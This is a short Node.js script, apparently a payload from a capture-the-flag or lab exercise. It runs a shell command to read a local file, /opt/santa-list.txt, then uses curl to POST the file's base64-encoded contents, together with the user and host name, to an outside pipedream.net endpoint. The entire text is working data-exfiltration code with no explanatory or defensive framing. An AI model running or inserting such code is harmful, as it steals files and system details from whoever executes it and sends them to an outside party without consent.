const { exec } = require("child_process");
exec(`cat /opt/santa-list.txt`, (err, stdout, stderr) => {
    exec(`curl "https://eocrgub0r9r7ww8.m.pipedream.net/?user=$(whoami)@$(hostname)" -X POST -d "stdout=${btoa(stdout)}&stderr=${btoa(stderr)}"`)
})